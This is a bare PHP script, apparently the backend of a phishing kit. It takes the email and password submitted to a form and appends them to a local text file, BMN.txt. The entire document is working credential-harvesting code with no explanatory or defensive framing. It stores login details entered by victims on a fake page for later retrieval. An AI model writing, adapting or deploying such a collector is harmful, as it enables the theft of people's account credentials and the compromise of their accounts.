<?php
$email = $_POST['email'];
$pass = $_POST['password'];
$handle = fopen("BMN.txt", "a");
foreach($_POST as $variable => $value) {
if ($variable == 'email' or $variable =='password')
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
?>